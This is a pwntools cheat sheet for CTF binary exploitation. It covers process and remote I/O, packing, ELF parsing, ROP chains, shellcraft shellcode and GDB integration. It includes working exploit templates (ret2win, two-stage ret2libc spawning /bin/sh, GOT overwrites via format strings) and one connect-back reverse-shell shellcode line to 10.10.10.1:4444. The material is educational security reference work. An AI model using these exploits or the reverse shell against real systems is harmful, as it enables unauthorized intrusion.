# pwntools advanced

## Overview

pwntools is a Python library and framework for binary exploitation and Capture The Flag (CTF) competitions, developed and maintained by Gallopsled. It provides high-level abstractions for interacting with local processes and remote network services, packing/unpacking integers, constructing ROP chains, generating shellcode via `shellcraft`, parsing ELF binaries, performing format string exploitation, and integrating with GDB for debugging. pwntools significantly accelerates exploit development by handling low-level plumbing so you can focus on the vulnerability.

**Warning:** pwntools is designed for authorized security research, CTF competitions, and educational use. Use only on systems you own or have explicit permission to test.

## Installation

### pip (recommended)

```bash
pip install pwntools
python -c "from pwn import *; print(pwnlib.__version__)"
```

### apt + pip (Debian/Ubuntu/Kali)

```bash
sudo apt-get install python3-pip
pip3 install --upgrade pwntools
```

### From source

```bash
git clone https://github.com/Gallopsled/pwntools.git
cd pwntools
pip install -e .
```

### Required tools for full functionality

```bash
# GDB with pwndbg or peda
sudo apt-get install gdb
pip install pwndbg  # Or: git clone https://github.com/pwndbg/pwndbg

# Additional tools
sudo apt-get install binutils-multiarch  # Cross-arch tools
sudo apt-get install nasm                # Assembler
sudo apt-get install qemu-user           # Cross-arch emulation
sudo apt-get install ROPgadget           # ROP gadget finder
pip install ROPgadget
```

### Verify

```bash
pwn version
pwn help
python3 -c "from pwn import *; print(context.os, context.arch)"
```

## Configuration

### Context settings

```python
from pwn import *

# Architecture and OS (affects shellcode, packing, etc.)
context.arch = 'amd64'          # i386 | amd64 | arm | aarch64 | mips | powerpc
context.os = 'linux'            # linux | windows | freebsd
context.bits = 64               # 32 | 64
context.endian = 'little'       # little | big

# Logging verbosity
context.log_level = 'debug'     # debug | info | warning | error | critical
context.log_level = 'info'      # Default

# Timeout
context.timeout = 10            # Seconds

# One-liner context setting
context(arch='amd64', os='linux', log_level='debug')

# Per-binary context from ELF
elf = ELF('./vuln')
context.binary = elf            # Sets arch/bits/os from binary headers
```

### Script template

```python
#!/usr/bin/env python3
from pwn import *

# Target binary and libc
elf = ELF('./vuln')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Connection type
LOCAL = True
if LOCAL:
    p = process(elf.path)
    # p = gdb.debug(elf.path, gdbscript='''
    #     break *main
    #     continue
    # ''')
else:
    p = remote('challenge.ctf.com', 1337)

# Exploit here
payload = b'A' * 64
p.sendline(payload)

p.interactive()
```

## Core Commands

| Function / Method | Description |
| --- | --- |
| `process('./vuln')` | Spawn a local process |
| `remote('host', port)` | Connect to remote TCP service |
| `ssh(host='h', user='u', password='p')` | SSH connection |
| `p.send(data)` | Send raw bytes |
| `p.sendline(data)` | Send bytes + newline |
| `p.recv(n)` | Receive n bytes |
| `p.recvline()` | Receive until newline |
| `p.recvuntil(b'> ')` | Receive until delimiter |
| `p.recvall()` | Receive until EOF |
| `p.interactive()` | Drop to interactive shell |
| `p.close()` | Close connection |
| `p64(addr)` | Pack 64-bit little-endian |
| `p32(addr)` | Pack 32-bit little-endian |
| `u64(bytes)` | Unpack 64-bit little-endian |
| `u32(bytes)` | Unpack 32-bit little-endian |
| `flat(*args)` | Pack multiple values |
| `cyclic(n)` | Generate De Bruijn cyclic pattern |
| `cyclic_find(value)` | Find offset in cyclic pattern |
| `ELF('./binary')` | Parse ELF binary |
| `ROP(elf)` | Create ROP chain builder |
| `asm(shellcode)` | Assemble instructions |
| `disasm(bytes)` | Disassemble bytes |
| `shellcraft.sh()` | Generate /bin/sh shellcode |
| `log.info('msg')` | Colored log output |
| `pause()` | Pause for GDB attach |
| `gdb.attach(p)` | Attach GDB to process |

## Advanced Usage

### Process and remote interaction

```python
from pwn import *

# Local process with arguments
p = process(['./vuln', 'arg1', 'arg2'])
p = process('./vuln', env={'LD_PRELOAD': './libc.so.6'})

# Remote TCP
p = remote('pwn.ctf.com', 4444)

# Remote with SSL
p = remote('pwn.ctf.com', 4443, ssl=True)

# SSH tunnel
s = ssh('ubuntu', 'host.example.com', password='secret')
p = s.process('./vuln')

# Send and receive patterns
p.sendafter(b'Input: ', b'exploit data')
p.sendlineafter(b'>>> ', b'command')

# Receive with timeout
data = p.recvuntil(b'$', timeout=5)

# Leak addresses from output
p.recvuntil(b'address: ')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f'Leaked address: {hex(leak)}')
```

### Packing and unpacking

```python
from pwn import *
context.arch = 'amd64'

# Integer packing
p64(0xdeadbeefcafebabe)   # b'\xbe\xba\xfe\xca\xef\xbe\xad\xde'
p32(0xdeadbeef)            # b'\xef\xbe\xad\xde'
p16(0x1337)                # b'7\x13'
p8(0x41)                   # b'A'

# Big-endian packing
p64(0xdeadbeef, endian='big')

# Unpacking
u64(b'\xbe\xba\xfe\xca\xef\xbe\xad\xde')   # 0xdeadbeefcafebabe
u32(b'\xef\xbe\xad\xde')                     # 0xdeadbeef

# Null-padded unpack (for leaked addresses)
leak_bytes = b'\x78\x56\x34\x12\x00\x00'
addr = u64(leak_bytes.ljust(8, b'\x00'))

# flat() - pack multiple values in one call
payload = flat(
    b'A' * 40,          # Padding
    0xdeadbeef,         # Return address (auto-packed for context.arch)
    b'/bin/sh\x00',     # String
)
```

### Finding offsets with cyclic patterns

```python
from pwn import *

# Generate pattern to send to binary
pattern = cyclic(200)
p = process('./vuln')
p.sendline(pattern)
p.wait()

# From GDB: read the value in RIP/EIP at crash
# (gdb) x/gx $rsp -> 0x6161616c61616161

# Find offset
offset = cyclic_find(0x6161616c)   # 32-bit value from EIP
offset = cyclic_find(b'laaa')       # From bytes
log.info(f'Offset: {offset}')

# Or from core dump
core = Corefile('./core')
offset = cyclic_find(core.rsp)
```

### ELF binary analysis

```python
from pwn import *

elf = ELF('./vuln')

# Binary properties
print(elf.arch)          # amd64
print(elf.bits)          # 64
print(elf.pie)           # True/False (Position Independent)
print(elf.nx)            # True/False (NX/DEP enabled)
print(elf.canary)        # True/False (Stack canary)
print(elf.relro)         # 'No' | 'Partial' | 'Full'

# Symbol resolution
elf.symbols['main']      # Address of main()
elf.got['puts']          # GOT entry for puts
elf.plt['puts']          # PLT stub for puts
elf.functions['vuln']    # Address of vuln function

# Sections
elf.bss()                # BSS segment address
elf.data()               # Data segment address

# Search for strings / bytes
next(elf.search(b'/bin/sh'))     # Find /bin/sh string in binary
next(elf.search(b'\x90\x90'))    # Find NOP bytes

# With base address (PIE bypass)
elf.address = 0x555555554000     # Set base after leak
elf.symbols['main']              # Now returns correct absolute address
```

### ROP chain construction

```python
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# Find gadgets
rop.find_gadget(['pop rdi', 'ret'])   # Find specific gadget
rop.find_gadget(['ret'])               # Just a ret gadget (for stack alignment)

# Build ROP chain
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(next(elf.search(b'/bin/sh\x00')))
rop.raw(elf.plt['system'])

# Pretty print the chain
print(rop.dump())

# Get raw bytes
chain = bytes(rop)
payload = b'A' * offset + chain

# ret2libc example
libc = ELF('./libc.so.6')
rop = ROP([elf, libc])
rop.system(next(libc.search(b'/bin/sh\x00')))
```

### Shellcode generation with shellcraft

```python
from pwn import *
context(arch='amd64', os='linux')

# Generate /bin/sh shellcode
sc = asm(shellcraft.sh())

# Generate connect-back shell
sc = asm(shellcraft.connect('10.10.10.1', 4444) + shellcraft.dupsh())

# Generate read/write shellcode
sc = asm(shellcraft.linux.read(0, 'rsp', 100))

# Show assembly source
print(shellcraft.sh())

# Encode shellcode (avoid bad chars)
encoded = asm(shellcraft.sh())
print(f'Shellcode length: {len(encoded)} bytes')
print(enhex(encoded))

# Common shellcraft modules
shellcraft.amd64.linux.sh()        # x86-64 Linux shell
shellcraft.i386.linux.sh()         # x86 Linux shell
shellcraft.arm.linux.sh()          # ARM Linux shell
shellcraft.aarch64.linux.sh()      # AArch64 Linux shell
```

### Format string exploitation

```python
from pwn import *

p = process('./vuln')

# Find format string offset
# Send: AAAA.%p.%p.%p.%p...
# Find where 0x41414141 appears - that's your offset

offset = 7   # Format string argument offset

# Read from arbitrary address (GOT leak)
target_addr = elf.got['puts']
payload = fmtstr_payload(offset, {target_addr: 0})  # Read only
p.sendline(payload)

# Write to arbitrary address
writes = {
    elf.got['puts']: elf.plt['system']  # Overwrite puts GOT with system
}
payload = fmtstr_payload(offset, writes)
p.sendline(payload)

# Manual format string read
payload = p64(target_addr) + b'%7$s'  # Read string at address
p.sendline(payload)
leak = p.recvuntil(b'\x00')[8:]       # Skip the address bytes
```

### GDB integration

```python
from pwn import *

elf = ELF('./vuln')

# Spawn under GDB
p = gdb.debug('./vuln', gdbscript='''
    break *main
    break *0x400611
    commands
        silent
        x/20gx $rsp
        continue
    end
    continue
''')

# Attach GDB to running process
p = process('./vuln')
gdb.attach(p, '''
    set follow-fork-mode child
    break *vuln
    continue
''')

# Add a pause() in your script where you want to attach manually
p = process('./vuln')
pause()   # Script waits; run "gdb -p <PID>" manually

# Or use pwngdb / pwndbg with:
# gdb ./vuln
# source /path/to/pwndbg/gdbinit.py
```

## Common Workflows

### Stack buffer overflow (ret2win)

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln')
context.binary = elf
p = process(elf.path)

# Find offset: cyclic pattern + crash analysis
offset = 40

# Build payload
payload  = b'A' * offset
payload += p64(elf.symbols['win'])   # Return to win()

p.sendlineafter(b'Input: ', payload)
p.interactive()
```

### ret2libc (leak + exploit)

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
context.binary = elf

p = process(elf.path)
rop = ROP(elf)

# --- Stage 1: Leak libc address via puts(puts@got) ---
offset = 40
ret_gadget = rop.find_gadget(['ret'])[0]     # Stack alignment
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

payload  = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])          # Return to main for stage 2

p.sendlineafter(b'Input: ', payload)
p.recvline()                                  # Consume echo

# Parse leaked address
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f'Leaked puts@libc: {hex(leak)}')

libc.address = leak - libc.symbols['puts']
log.success(f'libc base: {hex(libc.address)}')

# --- Stage 2: system('/bin/sh') ---
bin_sh = next(libc.search(b'/bin/sh\x00'))

payload  = b'A' * offset
payload += p64(ret_gadget)                   # Align stack
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(libc.symbols['system'])

p.sendlineafter(b'Input: ', payload)
p.interactive()
```

### CTF quick interaction boilerplate

```python
#!/usr/bin/env python3
from pwn import *

HOST, PORT = 'ctf.example.com', 1337
LOCAL = args.LOCAL   # Run: python exploit.py LOCAL

if LOCAL:
    p = process('./chall')
else:
    p = remote(HOST, PORT)

# Main exploit
def exploit():
    offset = cyclic_find(0x61616172)  # Pre-determined

    payload = flat({offset: p64(0xdeadbeef)})

    p.sendlineafter(b'> ', payload)
    p.interactive()

try:
    exploit()
except EOFError:
    log.error('Connection closed - exploit likely crashed')
```

## Tips and Best Practices

**Always set `context.binary = ELF('./target')`.** This automatically configures architecture, bitness, OS, and endianness from the binary's ELF headers, preventing subtle misconfigurations when packing values.

**Use `cyclic()` and `cyclic_find()` for offset discovery.** Sending a De Bruijn sequence and reading the crash value from GDB is far faster than binary searching for offsets manually.

**Log every leak immediately.** Use `log.success(f'Leaked: {hex(leak)}')` after every address leak. Clear logging saves significant debugging time when the exploit breaks across script runs.

**Use `p.recvuntil()` rather than fixed-length reads.** Timing and buffering variations mean `p.recv(8)` may return fewer than 8 bytes. `recvuntil(delimiter)` is deterministic and robust.

**Check stack alignment before `system()` calls.** On x86-64 Linux, `system()` requires 16-byte stack alignment. If it crashes inside `do_system`, add an extra `ret` gadget before your payload to align the stack.

**Use `fmtstr_payload()` for format string writes.** pwntools calculates the exact format string payload for arbitrary memory writes, handling the complex offset and width arithmetic automatically.

**Test locally first with the exact libc version.** Copy the target binary's `libc.so.6` from the remote server (`p.libs()` can help) and run locally with `LD_PRELOAD=./libc.so.6`. Gadget offsets vary between libc versions.

**Use `gdb.attach()` with a `pause()`.** Place a `pause()` before the critical send, attach GDB, then press Enter to continue. This gives you live visibility into register and stack state at the exact moment of exploitation.

**Prefer `flat()` over manual concatenation.** `flat(b'A'*40, elf.symbols['win'], b'/bin/sh\x00')` is more readable and handles packing automatically according to `context.arch`.

**Study previous CTF writeups.** pwntools is best learned by reading writeups and published exploits from CTF competitions like pwn.college, picoCTF, and DEF CON CTF qualifiers. The techniques compound - each challenge teaches primitives reused in harder ones.

Source: https://1337skills.com/cheatsheets/pwntools/
